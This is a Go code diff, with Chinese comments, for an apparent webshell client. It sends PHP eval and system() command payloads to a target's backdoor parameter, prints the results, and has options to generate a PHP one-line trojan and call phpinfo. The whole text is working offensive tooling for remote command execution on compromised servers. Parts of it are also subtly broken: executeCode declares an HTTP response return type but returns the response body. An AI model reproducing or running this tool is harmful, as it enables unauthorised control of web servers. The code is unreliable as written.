@@ -125,19 +125,38 @@ func makeRequest(payload string) (*http.Response, error) {
 	return client.Do(req) // 发送请求并返回响应
 }
 
-// executeCode 函数执行给定的 PHP 代码或系统命令
-func executeCode(payload string) {
-	evalPayload := "cmd=" + payload + ";"
+func shellExec(payload string) {
 	shellPayload := "cmd=system('" + payload + "');" // 修改此行，修复字符串拼接问题
-	fmt.Printf("%s\n%s\n", evalPayload, shellPayload)
+	respShell, err := makeRequest(shellPayload)
+	handleError(err, "请求执行系统命令失败")
+	defer func(body io.ReadCloser) {
+		err := body.Close()
+		handleError(err, "关闭响应失败")
+	}(respShell.Body)
 
+	// 读取和打印系统命令执行响应
+	bodyShell, err := io.ReadAll(respShell.Body)
+	handleError(err, "读取响应体失败")
+
+	if string(bodyShell) != "" {
+		fmt.Println("执行系统命令响应:")
+		fmt.Println(string(bodyShell))
+
+	}
+	//return string(bodyShell)
+}
+
+func phpinfo() {
+	info := executeCode("phpinfo()")
+	fmt.Println(info)
+
+}
+
+func executeCode(payload string) *http.Response {
+	evalPayload := "cmd=" + payload + ";"
 	// 使用 makeRequest 发送 PHP 代码执行请求
 	respEval, err := makeRequest(evalPayload)
 	handleError(err, "请求执行代码失败")
-
-	// 使用 makeRequest 发送系统命令执行请求
-	respShell, err := makeRequest(shellPayload)
-	handleError(err, "请求执行系统命令失败")
 
 	// 延迟关闭响应体
 	defer func(body io.ReadCloser) {
@@ -145,28 +164,16 @@ func executeCode(payload string) {
 		handleError(err, "关闭响应失败")
 	}(respEval.Body)
 
-	defer func(body io.ReadCloser) {
-		err := body.Close()
-		handleError(err, "关闭响应失败")
-	}(respShell.Body)
-
 	// 读取和打印 PHP 代码执行响应
 	bodyEval, err := io.ReadAll(respEval.Body)
-	handleError(err, "读取响应体失败")
-
-	// 读取和打印系统命令执行响应
-	bodyShell, err := io.ReadAll(respShell.Body)
 	handleError(err, "读取响应体失败")
 
 	if string(bodyEval) != "" {
 		fmt.Println("执行代码响应:")
 		fmt.Println(string(bodyEval))
 	}
+	return bodyEval
 
-	if string(bodyShell) != "" {
-		fmt.Println("执行系统命令响应:")
-		fmt.Println(string(bodyShell))
-	}
 }
 
 func generateWebShell() {
@@ -199,6 +206,7 @@ func main() {
 	webShell := flag.Bool("generate-shell", false, "生成php的一句话木马")
 	dbInfo := flag.Bool("dbinfo", false, "显示目前数据库信息")
 	addDb := flag.Bool("adddb", false, "添加数据")
+	phpInfo := flag.Bool("phpinfo", false, "查看phpinfo")
 
 	flag.Parse()
 
@@ -207,13 +215,15 @@ func main() {
 	} else if *code != "" {
 		executeCode(*code)
 	} else if *shell != "" {
-		executeCode(*shell)
+		shellExec(*shell)
 	} else if *webShell {
 		generateWebShell()
 	} else if *dbInfo {
 		selectDb()
 	} else if *addDb {
 		addURL()
+	} else if *phpInfo {
+		phpinfo()
 	} else {
 		printLogo()
 	}
